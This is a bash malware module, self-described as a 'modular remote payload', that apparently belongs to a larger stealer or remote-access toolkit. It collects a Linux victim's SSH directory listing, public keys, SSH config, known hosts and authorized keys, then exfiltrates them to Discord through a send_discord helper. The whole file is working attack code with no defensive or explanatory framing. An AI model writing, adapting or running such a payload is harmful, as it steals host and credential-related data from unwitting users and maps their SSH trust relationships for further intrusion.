#!/bin/bash
# ============================================================
# SSH Keys Extractor for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔑 **SSH Keys from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

SSH_DIR="$HOME/.ssh"

if [[ -d "$SSH_DIR" ]]; then
    OUTPUT+="**📁 SSH Directory Contents:**\n"
    ls -la "$SSH_DIR" 2>/dev/null | while read line; do
        OUTPUT+="\`$line\`\n"
    done
    OUTPUT+="\n"
    
    # Public keys
    OUTPUT+="**🔓 Public Keys:**\n"
    for key in "$SSH_DIR"/*.pub; do
        if [[ -f "$key" ]]; then
            OUTPUT+="📄 $(basename "$key"):\n"
            OUTPUT+="\`\`\`$(cat "$key")\`\`\`\n\n"
        fi
    done
    
    # SSH config
    if [[ -f "$SSH_DIR/config" ]]; then
        OUTPUT+="**⚙️ SSH Config:**\n"
        OUTPUT+="\`\`\`$(cat "$SSH_DIR/config")\`\`\`\n\n"
    fi
    
    # Known hosts
    if [[ -f "$SSH_DIR/known_hosts" ]]; then
        OUTPUT+="**🌐 Known Hosts (first 10):**\n"
        OUTPUT+="\`\`\`$(head -10 "$SSH_DIR/known_hosts")\`\`\`\n"
    fi
    
    # Authorized keys
    if [[ -f "$SSH_DIR/authorized_keys" ]]; then
        OUTPUT+="**✅ Authorized Keys:**\n"
        OUTPUT+="\`\`\`$(cat "$SSH_DIR/authorized_keys")\`\`\`\n"
    fi
else
    OUTPUT+="⚠️ No .ssh directory found\n"
fi

# Send to Discord
send_discord "$OUTPUT"

